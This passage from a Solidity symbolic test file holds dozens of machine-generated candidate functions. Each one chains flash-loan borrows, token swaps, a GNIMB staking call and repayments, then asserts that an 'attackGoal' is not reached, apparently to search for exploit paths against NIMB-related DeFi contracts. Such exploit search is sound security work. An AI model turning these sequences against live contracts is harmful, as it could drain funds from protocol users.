        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5108(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5109(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5110(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5111(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5112(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5113(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5114(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5115(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5116(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5117(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5118(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5119(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5120(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5121(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5122(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5123(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5124(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5125(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5126(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5127(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5128(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5129(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5130(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5131(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5132(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5133(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5134(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5135(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5136(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5137(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5138(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5139(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5140(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5141(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5142(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5143(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5144(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5145(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5146(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5147(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5148(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5149(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5150(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5151(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5152(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
